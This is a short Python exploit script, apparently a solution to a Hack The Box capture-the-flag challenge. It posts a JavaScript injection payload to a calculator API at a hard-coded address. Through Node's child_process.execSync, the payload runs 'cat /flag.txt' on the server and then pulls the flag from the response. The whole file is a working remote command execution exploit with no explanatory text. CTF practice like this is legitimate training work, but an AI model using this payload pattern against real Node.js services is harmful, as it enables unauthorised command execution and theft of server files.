import requests
import re 

host, port = "83.136.253.59", 39476

url = f"http://{host}:{port}"
url_calculate = f"{url}/api/calculate"

data = {
    "formula": "global.process.mainModule.require('child_process').execSync('cat /flag.txt').toString()"
}

response = requests.post(url_calculate, json=data)

flag = re.search(r'HTB\{.*?\}',response.text)

print(flag.group())